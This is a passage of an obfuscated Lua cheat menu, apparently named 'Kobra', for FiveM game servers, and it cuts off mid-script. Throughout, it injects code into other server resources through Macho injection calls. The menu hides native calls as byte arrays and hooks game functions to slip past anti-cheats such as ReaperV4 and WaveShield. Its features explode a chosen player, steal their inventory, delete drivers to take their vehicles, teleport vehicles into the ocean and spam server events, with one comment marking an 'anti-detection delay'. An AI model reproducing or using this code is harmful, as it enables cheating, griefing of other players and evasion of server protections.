Appearance",desc="Copy Players Clothing",onSelect=function() local v415={};for v571,v572 in pairs(v27) do if v572 then v415[ #v415 + 1 ]=v571;end end if ( #v415==(1818 -(821 + 997))) then local v633=255 -(195 + 60) ;while true do if (v633==0) then v268:Notify("error","Kobra","You must select a player to do this!",807 + 2193 );return;end end end local v416=v415[1502 -(251 + 1250) ];local v417=GetResourceState("ReaperV4")=="started" ;if v417 then MachoInjectThread(0 -0 ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v416));else local v634=0 + 0 ;local v635;local v636;local v637;local v638;local v639;while true do if (v634==0) then v635=nil;function v635(v878) local v879={};for v976=1, #v878 do v879[v976]=string.byte(v878,v976);end return v879;end v636=nil;v634=1033 -(809 + 223) ;end if (2==v634) then v638=nil;function v638(v880) local v881=0;local v882;while true do if ((1 -0)==v881) then return  -(2 -1);end if (v881==0) then v882=v637(v635("GetActivePlayers"))();for v1102,v1103 in ipairs(v882) do if (v637(v635("GetPlayerServerId"))(v1103)==v880) then return v1103;end end v881=3 -2 ;end end end v639=nil;v634=3 + 0 ;end if (v634==(2 + 1)) then function v639(v883) local v884=v638(v883);if (v884== -(618 -(14 + 603))) then local v1012=129 -(118 + 11) ;while true do if (v1012==(0 + 0)) then print("^1[ERROR] Client ID not found for Server ID: "   .. v883   .. "^0" );return;end end end local v885=v637(v635("GetPlayerPed"))(v884);local v886=v637(v635("PlayerPedId"))();if (v637(v635("DoesEntityExist"))(v885) and v637(v635("DoesEntityExist"))(v886)) then print("^2[Kobra] Copying clothing from Server ID: "   .. v883   .. "^0" );v637(v635("SetPedComponentVariation"))(v886,1 + 0 ,v637(v635("GetPedDrawableVariation"))(v885,1),v637(v635("GetPedTextureVariation"))(v885,1),0);v637(v635("SetPedComponentVariation"))(v886,8 -5 ,v637(v635("GetPedDrawableVariation"))(v885,952 -(551 + 398) ),v637(v635("GetPedTextureVariation"))(v885,2 + 1 ),0 + 0 );v637(v635("SetPedComponentVariation"))(v886,4,v637(v635("GetPedDrawableVariation"))(v885,4),v637(v635("GetPedTextureVariation"))(v885,4 + 0 ),0 -0 );v637(v635("SetPedComponentVariation"))(v886,13 -7 ,v637(v635("GetPedDrawableVariation"))(v885,2 + 4 ),v637(v635("GetPedTextureVariation"))(v885,6),0 -0 );v637(v635("SetPedComponentVariation"))(v886,3 + 5 ,v637(v635("GetPedDrawableVariation"))(v885,97 -(40 + 49) ),v637(v635("GetPedTextureVariation"))(v885,30 -22 ),0);v637(v635("SetPedComponentVariation"))(v886,501 -(99 + 391) ,v637(v635("GetPedDrawableVariation"))(v885,11),v637(v635("GetPedTextureVariation"))(v885,11),0 + 0 );v637(v635("SetPedPropIndex"))(v886,0 -0 ,v637(v635("GetPedPropIndex"))(v885,0 -0 ),v637(v635("GetPedPropTextureIndex"))(v885,0 + 0 ),true);v637(v635("SetPedPropIndex"))(v886,1,v637(v635("GetPedPropIndex"))(v885,1),v637(v635("GetPedPropTextureIndex"))(v885,2 -1 ),true);v637(v635("SetPedPropIndex"))(v886,2,v637(v635("GetPedPropIndex"))(v885,1606 -(1032 + 572) ),v637(v635("GetPedPropTextureIndex"))(v885,2),true);print("^2[Kobra] Clothing copied successfully!^0");else print("^3[WARNING] Target or local ped does not exist.^0");end end v639(v416);break;end if (v634==(418 -(203 + 214))) then function v636(v887) local v888=1817 -(568 + 1249) ;local v889;while true do if (v888==(0 + 0)) then v889="";for v1104=2 -1 , #v887 do v889=v889   .. string.char(v887[v1104]) ;end v888=3 -2 ;end if (v888==1) then return v889;end end end v637=nil;function v637(v890) local v891=1306 -(913 + 393) ;local v892;local v893;while true do if (v891==(2 -1)) then return v893;end if (v891==(0 -0)) then v892=v636(v890);v893=_G[v892];v891=411 -(269 + 141) ;end end end v634=4 -2 ;end end end v268:Notify("success","Kobra","Copied clothing!",6981 -(362 + 1619) );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v418={};for v573,v574 in pairs(v27) do if v574 then v418[ #v418 + (1626 -(950 + 675)) ]=v573;end end if ( #v418==(0 + 0)) then v268:Notify("error","Kobra","You must select a player to do this!",4179 -(216 + 963) );return;end v268:HandleLaunchPlayer(v418);v268:Notify("success","Kobra","Attempting to TEST",6287 -(485 + 802) );end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v419=1073 -(1065 + 8) ;local v420;while true do if (v419==(2 + 0)) then v12:UpdateListMenu();break;end if (0==v419) then v420={};for v783,v784 in pairs(v27) do if v784 then v420[ #v420 + 1 ]=v783;end end v419=1;end if (v419==1) then if ( #v420==(1601 -(635 + 966))) then v268:Notify("error","Kobra","You must select a player to do this!",2157 + 843 );return;end for v785,v786 in ipairs(v420) do local v787=42 -(5 + 37) ;local v788;local v789;while true do if (v787==(2 -1)) then if ((v789== -(1 + 0)) or  not DoesEntityExist(GetPlayerPed(v789))) then v268:Notify("error","Kobra","You must select a player to do this!",3000);v27[v786]=nil;return;else local v1081=0 -0 ;local v1082;while true do if (v1081==(1 + 0)) then v268:Notify("success","Kobra","Attempting to Explode Player",5000);break;end if (v1081==(0 -0)) then v1082=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v788)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v1082,v788);v1081=3 -2 ;end end end break;end if (v787==(0 -0)) then v788=v786;v789=GetPlayerFromServerId(v786);v787=1;end end end v419=2;end end end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v421={};for v575,v576 in pairs(v27) do if v576 then v421[ #v421 + 1 ]=v575;end end if ( #v421==(0 + 0)) then local v640=529 -(318 + 211) ;while true do if (v640==0) then v268:Notify("error","Kobra","You must select a player to do this!",14761 -11761 );return;end end end v268:HandleTakeInventory(v421);v268:Notify("success","Kobra","Attempting to steal inventory",5000);end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v422=846 -(518 + 328) ;local v423;while true do if (v422==(2 -1)) then if ( #v423==(0 -0)) then local v852=317 -(301 + 16) ;while true do if (v852==(0 -0)) then v268:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v268:HandleClonePlayer(v423);v422=5 -3 ;end if (v422==(0 -0)) then v423={};for v790,v791 in pairs(v27) do if v791 then v423[ #v423 + 1 + 0 ]=v790;end end v422=1;end if (v422==(2 + 0)) then v268:Notify("success","Kobra","Cloned Player",5000);break;end end end},{type="button",label="Attack Clone Player",onSelect=function() local v424={};for v577,v578 in pairs(v27) do if v578 then v424[ #v424 + 1 + 0 ]=v577;end end if ( #v424==(0 + 0)) then local v641=0;while true do if (v641==(0 -0)) then v268:Notify("error","Kobra","You must select a player to do this!",969 + 2031 );return;end end end v268:HandleAttackClonePlayer(v424);v268:Notify("success","Kobra","Cloned Player",6019 -(829 + 190) );end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1 -0 ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v425) local v426=1761 -(440 + 1321) ;local v427;while true do if ((1830 -(1059 + 770))==v426) then if ( #v427==0) then v268:Notify("error","Kobra","You must select a player to do this!",13872 -10872 );return;end v12:AttachSelectedVehicle(v427,v425);v426=2;end if (v426==(547 -(424 + 121))) then v268:Notify("success","Kobra","Vehicle Attached to "   ..  #v427   .. " Player(s)" ,912 + 4088 );break;end if (v426==(1347 -(641 + 706))) then v427={};for v792,v793 in pairs(v27) do if v793 then v427[ #v427 + 1 + 0 ]=v792;end end v426=441 -(249 + 191) ;end end end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=1 + 0 ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v428) local v429=0 + 0 ;local v430;while true do if (v429==(1 + 0)) then if ( #v430==(0 + 0)) then local v853=0 -0 ;while true do if (v853==(0 + 0)) then v268:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v794) return v428;end;v429=598 -(157 + 439) ;end if (v429==(0 -0)) then v430={};for v795,v796 in pairs(v27) do if v796 then v430[ #v430 + (3 -2) ]=v795;end end v429=1;end if (v429==(5 -3)) then v12:SpawnSelectedObject(v430);break;end end end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=919 -(782 + 136) ,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v431) local v432={};for v579,v580 in pairs(v27) do if v580 then v432[ #v432 + 1 ]=v579;end end if ( #v432==0) then v268:Notify("error","Kobra","You must select at least one player!",3000);return;end v12.GetSelectedObjectModel=function(v581) return v431;end;v12:SpawnSelectedObject(v432);v268:Notify("success","Kobra","Spawned object '"   .. tostring(v431)   .. "' for "   ..  #v432   .. " player(s)." ,8892 -3892 );end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v434) local v435={};for v582,v583 in pairs(v27) do if v583 then v435[ #v435 + 1 ]=v582;end end if ( #v435==(0 + 0)) then local v642=0 + 0 ;while true do if (v642==(0 -0)) then v268:Notify("error","Kobra","You must select at least one player!",3776 -776 );return;end end end v12.GetSelectedObjectModel=function(v584) return v434;end;v12:SpawnSelectedObject(v435);end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1 + 0 ,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v437) local v438=0 -0 ;local v439;while true do if (v438==(1550 -(647 + 902))) then if ( #v439==0) then v268:Notify("error","Kobra","You must select at least one player!",9020 -6020 );return;end v12.GetSelectedObjectModel=function(v797) return v437;end;v438=235 -(85 + 148) ;end if (v438==(1289 -(426 + 863))) then v439={};for v798,v799 in pairs(v27) do if v799 then v439[ #v439 + (4 -3) ]=v798;end end v438=1655 -(873 + 781) ;end if (v438==(2 -0)) then v12:SpawnSelectedObject(v439);v268:Notify("success","Kobra","Spawned object '"   .. tostring(v437)   .. "' for "   ..  #v439   .. " player(s)." ,13503 -8503 );break;end end end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v440=nil;for v585,v586 in pairs(v27) do if v586 then v440=v585;break;end end if v440 then local v643=GetPlayerFromServerId(v440);if (v643== -(1 -0)) then local v800=0 -0 ;while true do if (v800==1) then v12:UpdateListMenu();return;end if (v800==0) then v268:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",4947 -(414 + 1533) );v27[v440]=nil;v800=1 + 0 ;end end end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v643))) then v268:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",3555 -(443 + 112) );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v854=1480 -(888 + 591) ,2 do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v643))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v440]=true;v268:UpdateListMenu();else v268:Notify("error","Kobra","You must select a player to do this!",7751 -4751 );end end},{type="button",label="Teleport to Ocean",onSelect=function() local v441=nil;for v587,v588 in pairs(v27) do if v588 then v441=v587;break;end end if v441 then local v645=0 -0 ;local v646;while true do if (2==v645) then v27[v441]=true;v268:UpdateListMenu();break;end if ((0 + 0)==v645) then v646=GetPlayerFromServerId(v441);if (v646== -(1 + 0)) then local v979=0 + 0 ;while true do if (v979==1) then v12:UpdateListMenu();return;end if (v979==(0 -0)) then v268:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",5557 -2557 );v27[v441]=nil;v979=1;end end end v645=1679 -(136 + 1542) ;end if (v645==(3 -2)) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v646))) then v268:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",2978 + 22 );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1013=1,2 -0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v646))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v645=2;end end else v268:Notify("error","Kobra","You must select a player to do this!",3000);end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v442) if v442 then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);else local v647=0;while true do if (v647==(0 -0)) then print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
